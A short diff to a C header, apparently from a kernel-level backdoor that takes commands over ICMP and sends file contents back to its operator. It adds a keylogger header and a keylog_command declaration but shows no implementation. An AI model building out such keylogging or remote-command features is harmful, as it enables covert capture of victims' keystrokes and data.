@@ -8,6 +8,7 @@
 #include "debug.h"
 #include "args.h"
 #include "icmp.h"
+#include "keylogger.h"
 
 
 // parses the command, deletes the command string from data and returns the respective command
@@ -21,6 +22,8 @@ int read_file(char* filename, char* buffer, int to_read, loff_t start);
 
 // reads the given file and sends its content to user
 void cat_command(args_t* args);
+
+void keylog_command(args_t* args);
 
 
 
